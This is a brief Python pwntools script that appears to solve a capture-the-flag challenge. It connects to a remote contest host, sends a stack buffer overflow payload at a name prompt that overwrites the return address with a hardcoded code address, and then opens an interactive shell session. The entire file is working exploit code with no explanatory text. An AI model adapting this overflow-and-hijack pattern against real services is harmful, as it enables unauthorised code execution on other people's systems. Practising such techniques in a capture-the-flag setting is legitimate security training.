from pwn import *

# env setting
context(arch = 'amd64', os = 'linux')
#context.terminal = ['tmux', 'splitw', '-h']
#context.log_level = 'DEBUG'

def connect():
  if True:
      return remote(host='chals1.ais3.org', port=11111)
  else:
      return process('./pwn')

def main():
  p = connect()

  # payload 
  shellcode_address = 0x04017AA 
  payload = b'a'*71 + p64(0xdeadbeef) + p64(shellcode_address)
  
  # send
  #gdb.attach(p)
  p.sendlineafter(b'Show me your name: ', payload)
  p.interactive()

if __name__=='__main__':
  main()
